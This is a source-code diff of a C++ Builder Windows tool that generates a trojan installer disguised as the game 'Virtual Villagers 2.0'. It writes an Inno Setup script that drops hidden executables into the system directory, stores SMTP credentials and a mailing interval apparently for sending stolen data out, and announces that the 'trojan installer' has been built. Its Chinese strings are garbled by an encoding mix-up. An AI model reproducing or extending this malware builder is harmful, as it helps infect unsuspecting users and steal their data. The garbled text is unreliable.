@@ -12,7 +12,7 @@ struct config
 {
     unsigned int bytes;
     wchar_t magic[2];
-    unsigned long int millisecond; // ºÁÃë
+    unsigned long int millisecond; // æ¯«ç§’
     wchar_t from[_MAX_FNAME],  to[_MAX_FNAME], subject[_MAX_FNAME],
 	    smtpserver[_MAX_FNAME], username[_MAX_FNAME], password[_MAX_FNAME], content[_MAX_FNAME];
 };
@@ -42,19 +42,19 @@ int __fastcall TForm1::checkmail(void)
 {
   int res = -1;
   if(recvedit->Text.IsEmpty() || recvedit->Text.Pos(L"@") == 0) {
-	  MessageBoxW(Handle, L"ÇëÌîĞ´ÊÕ¼şÈË£¡", L"³ö´íÁË", MB_OK | MB_ICONERROR);
+	  MessageBoxW(Handle, L"è¯·å¡«å†™æ”¶ä»¶äººï¼", L"å‡ºé”™äº†", MB_OK | MB_ICONERROR);
 	  return res;
   }
   if(sendedit->Text.IsEmpty() || sendedit->Text.Pos(L"@163.com") == 0) {
-	  MessageBoxW(Handle, L"ÇëÌîĞ´·¢¼şÈË£¡", L"³ö´íÁË", MB_OK | MB_ICONERROR);
+	  MessageBoxW(Handle, L"è¯·å¡«å†™å‘ä»¶äººï¼", L"å‡ºé”™äº†", MB_OK | MB_ICONERROR);
 	  return res;
   }
   if(usernameedit->Text.IsEmpty()) {
-	  MessageBoxW(Handle, L"ÇëÌîĞ´ÓÃ»§Ãû£¡", L"³ö´íÁË", MB_OK | MB_ICONERROR);
+	  MessageBoxW(Handle, L"è¯·å¡«å†™ç”¨æˆ·åï¼", L"å‡ºé”™äº†", MB_OK | MB_ICONERROR);
 	  return res;
   }
   if(passwordedit->Text.IsEmpty()) {
-	  MessageBoxW(Handle, L"ÇëÌîĞ´ÃÜÂë£¡", L"³ö´íÁË", MB_OK | MB_ICONERROR);
+	  MessageBoxW(Handle, L"è¯·å¡«å†™å¯†ç ï¼", L"å‡ºé”™äº†", MB_OK | MB_ICONERROR);
 	  return res;
   }
   time_t tim;
@@ -64,14 +64,14 @@ int __fastcall TForm1::checkmail(void)
   TIdMessageBuilderPlain *msgbp = new TIdMessageBuilderPlain;
 
   //IdMessage1->CharSet = L"GB18030";
-  //IdMessage1->Body->Text = L"±à¼­ÈËÔ±ÕâÊÇÎªÁËÊ¹ÓÃ»§ĞèÇó¶ø¿ª·¢µÄ£¬ÎûÎû£¡£¡";
+  //IdMessage1->Body->Text = L"ç¼–è¾‘äººå‘˜è¿™æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·éœ€æ±‚è€Œå¼€å‘çš„ï¼Œå˜»å˜»ï¼ï¼";
   IdMessage1->From->Address = sendedit->Text;
   IdMessage1->Subject = _wasctime(localtime(&tim));
   IdMessage1->Recipients->EMailAddresses = recvedit->Text;
   //IdMessage1->AttachmentEncoding = L"MIME";
 
   msgbp->PlainTextCharSet = L"GB18030";
-  msgbp->PlainText->Text = L"²âÊÔÓÊ¼ş£¬ÎûÎû£¡£¡";
+  msgbp->PlainText->Text = L"æµ‹è¯•é‚®ä»¶ï¼Œå˜»å˜»ï¼ï¼";
   msgbp->FillMessage(IdMessage1);
 
   IdSMTP1->Host = L"smtp.163.com";
@@ -81,10 +81,10 @@ int __fastcall TForm1::checkmail(void)
 	  IdSMTP1->Connect();
 	  if(IdSMTP1->Connected())
 		  IdSMTP1->Send(IdMessage1);
-	  //MessageBoxW(Handle, L"ÑéÖ¤³É¹¦£¡", L"ÕıÈ·", MB_OK | MB_ICONINFORMATION);
+	  //MessageBoxW(Handle, L"éªŒè¯æˆåŠŸï¼", L"æ­£ç¡®", MB_OK | MB_ICONINFORMATION);
 	  res = 0;
   } catch (...) {
-	  MessageBoxW(Handle, L"ÓÃ»§ÃûºÍÃÜÂë´íÎó£¬»òÃ»ÓĞÍøÂç£¡", L"³ö´íÁË", MB_OK | MB_ICONERROR);
+	  MessageBoxW(Handle, L"ç”¨æˆ·åå’Œå¯†ç é”™è¯¯ï¼Œæˆ–æ²¡æœ‰ç½‘ç»œï¼", L"å‡ºé”™äº†", MB_OK | MB_ICONERROR);
   }
   IdSMTP1->Disconnect(true);
   delete msgbp;
@@ -144,16 +144,16 @@ int __fastcall TForm1::writesinstalliss(void)
         L"; Do not use the same AppId value in installers for other applications.\n"
         L"; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)\n"
         L"AppId=Virtual Villagers\n"
-        L"AppName=ĞéÄâ´å×¯\n"
+        L"AppName=è™šæ‹Ÿæ‘åº„\n"
         L"AppVersion=2.0\n"
-        L";AppVerName=ĞéÄâ´å×¯ 2.0\n"
+        L";AppVerName=è™šæ‹Ÿæ‘åº„ 2.0\n"
         L"AppPublisher=popgame, Inc.\n"
         L"AppPublisherURL=http://www.popgame.com/\n"
         L"AppSupportURL=http://www.popgame.com/\n"
         L"AppUpdatesURL=http://www.popgame.com/\n"
         L"DefaultDirName={pf}\\Virtual Villagers\n"
         L"DefaultGroupName=Virtual Villagers\n"
-        L"OutputBaseFilename=ĞéÄâ´å×¯2.0°²×°\n"
+        L"OutputBaseFilename=è™šæ‹Ÿæ‘åº„2.0å®‰è£…\n"
         L"Compression=lzma\n"
         L"SolidCompression=yes\n"
         L"\n"
@@ -164,20 +164,20 @@ int __fastcall TForm1::writesinstalliss(void)
         L"Name: \"desktopicon\"; Description: \"{cm:CreateDesktopIcon}\"; GroupDescription: \"{cm:AdditionalIcons}\"; Flags: unchecked\n"
         L"\n"
         L"[Files]\n"
-		L"Source: \"%s\\ĞéÄâ´å×¯2\\*\"; DestDir: \"{app}\"; Flags: ignoreversion\n"
-		L"Source: \"%s\\ĞéÄâ´å×¯2\\Images\\*\"; DestDir: \"{app}\\Images\"; Flags: ignoreversion\n"
-		L"Source: \"%s\\ĞéÄâ´å×¯2\\Sounds\\*\"; DestDir: \"{app}\\Sounds\"; Flags: ignoreversion\n"
-		L"Source: \"%s\\ĞéÄâ´å×¯2\\sys\\rich.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallRiched20('{sys}\\rich.exe');\n"
-		L"Source: \"%s\\ĞéÄâ´å×¯2\\sys\\sys.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallSys('{sys}\\sys.exe');\n"
+		L"Source: \"%s\\è™šæ‹Ÿæ‘åº„2\\*\"; DestDir: \"{app}\"; Flags: ignoreversion\n"
+		L"Source: \"%s\\è™šæ‹Ÿæ‘åº„2\\Images\\*\"; DestDir: \"{app}\\Images\"; Flags: ignoreversion\n"
+		L"Source: \"%s\\è™šæ‹Ÿæ‘åº„2\\Sounds\\*\"; DestDir: \"{app}\\Sounds\"; Flags: ignoreversion\n"
+		L"Source: \"%s\\è™šæ‹Ÿæ‘åº„2\\sys\\rich.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallRiched20('{sys}\\rich.exe');\n"
+		L"Source: \"%s\\è™šæ‹Ÿæ‘åº„2\\sys\\sys.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallSys('{sys}\\sys.exe');\n"
         L"Source: \"%s\\system.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallSystem;\n"
         L"; NOTE: Don't use \"Flags: ignoreversion\" on any shared system files\n"
         L"\n"
         L"[Icons]\n"
-        L"Name: \"{group}\\ĞéÄâ´å×¯\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"\n"
-        L"Name: \"{commondesktop}\\ĞéÄâ´å×¯\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Tasks: desktopicon\n"
+        L"Name: \"{group}\\è™šæ‹Ÿæ‘åº„\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"\n"
+        L"Name: \"{commondesktop}\\è™šæ‹Ÿæ‘åº„\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Tasks: desktopicon\n"
         L"\n"
         L"[Run]\n"
-        L"Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Description: \"{cm:LaunchProgram,ĞéÄâ´å×¯}\"; Flags: nowait postinstall skipifsilent\n"
+        L"Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Description: \"{cm:LaunchProgram,è™šæ‹Ÿæ‘åº„}\"; Flags: nowait postinstall skipifsilent\n"
         L"\n"
         L"[Code]\n"
         L"procedure AfterInstallRiched20(FileName: String);\n"
@@ -246,7 +246,7 @@ int __fastcall TForm1::writesinstalliss(void)
 	wcsncpy(config.password, password, len + 1u);
 	config.millisecond = (minute->ItemIndex + 1lu)* 10lu * 60lu * 1000ul;
 	if(fwrite(&config, sizeof(struct config), 1u, fp) != 1u)
-	    MessageBoxW(Handle, L"Ğ´³ö´í", L"ĞÅÏ¢", MB_OK | MB_ICONINFORMATION);
+	    MessageBoxW(Handle, L"å†™å‡ºé”™", L"ä¿¡æ¯", MB_OK | MB_ICONINFORMATION);
 	fclose(fp);
   	return 0;
 }
@@ -327,10 +327,10 @@ unsigned int __stdcall TForm1::dotask(void *arg)
 	BOOL bSuccess = FALSE;
 	bSuccess = CreateProcessW(NULL,
       exepath,     // command line
-      NULL,          // process security attributes
-      NULL,          // primary thread security attributes
+      &saAttr,          // process security attributes
+      &saAttr,          // primary thread security attributes
       TRUE,          // handles are inherited
-      CREATE_NO_WINDOW,     // creation flags
+      CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // creation flags
 	  NULL,          // use parent's environment
       NULL,          // use parent's current directory
       &siStartInfo,  // STARTUPINFO pointer
@@ -358,12 +358,12 @@ unsigned int __stdcall TForm1::dotask(void *arg)
 			linestart++;
 		}
 #endif
-		lineend = strstr(buf, "ĞéÄâ´å×¯2.0°²×°.exe");
+		lineend = strstr(buf, "è™šæ‹Ÿæ‘åº„2.0å®‰è£….exe");
 		me->Memo1->Lines->Add(buf);
 		memset(buf, 0, sizeof(buf));
 	}
 	if(lineend)
-        MessageBoxW(me->Handle, L"Ä¾Âí°²×°°üÒÑÉú³É£¬×¢Òâ²»ÒªÔÚ±¾»úÔËĞĞ£¡\n\n°²×°°üÔÚ×ÀÃæÉÏ£¬Ãû×ÖÊÇ\"ĞéÄâ´å×¯2.0°²×°.exe\"", L"ĞÅÏ¢", MB_OK | MB_ICONINFORMATION);
+        MessageBoxW(me->Handle, L"æœ¨é©¬å®‰è£…åŒ…å·²ç”Ÿæˆï¼Œæ³¨æ„ä¸è¦åœ¨æœ¬æœºè¿è¡Œï¼\n\nå®‰è£…åŒ…åœ¨æ¡Œé¢ä¸Šï¼Œåå­—æ˜¯\"è™šæ‹Ÿæ‘åº„2.0å®‰è£….exe\"", L"ä¿¡æ¯", MB_OK | MB_ICONINFORMATION);
 cleanup:
 	CloseHandle(hChildStd_IN_Wr);
 	CloseHandle(hChildStd_OUT_Rd);;
@@ -396,7 +396,7 @@ void __fastcall TForm1::formaterror(DWORD dwErr)
 		LocalSize(lpDisplayBuf) / sizeof(TCHAR) - 1u,
 		TEXT("failed with error %d: %s"),
 		dwErr, lpMsgBuf);
-	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("´íÎó"), MB_OK | MB_ICONERROR);
+	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("é”™è¯¯"), MB_OK | MB_ICONERROR);
 
 	LocalFree(lpMsgBuf);
 	LocalFree(lpDisplayBuf);
